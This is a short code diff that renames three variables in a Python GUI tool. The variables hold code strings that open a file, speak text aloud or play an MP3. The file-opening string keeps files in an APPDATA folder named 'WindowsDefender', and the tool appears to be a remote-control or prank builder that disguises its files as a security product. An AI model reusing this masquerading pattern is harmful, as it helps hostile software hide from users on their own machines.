@@ -15,7 +15,7 @@ def open_other_files_window():
         if event == "Exit" or event == sg.WIN_CLOSED:
             break
         if event == "Open File":
-            st1 = '''
+            Open_File_st = '''
             path = os.path.join(os.getenv('APPDATA'), "WindowsDefender")
             filename = values[0]
             file_path = os.path.join(path, filename)
@@ -61,7 +61,7 @@ def tts_window():
         if event == "Exit" or event == sg.WIN_CLOSED:
             break
         if event == "Send TTS":
-            st2 = '''
+            tts_st = '''
             from gtts import gTTS
             from playsound import playsound
             # ask for text to speak
@@ -102,7 +102,7 @@ def open_mp3_window():
         if event == "Exit" or event == sg.WIN_CLOSED:
             break
         if event == "Open MP3":
-            st3 = '''
+            open_mp3_st = '''
             from pygame import mixer
             import pygame
             import os
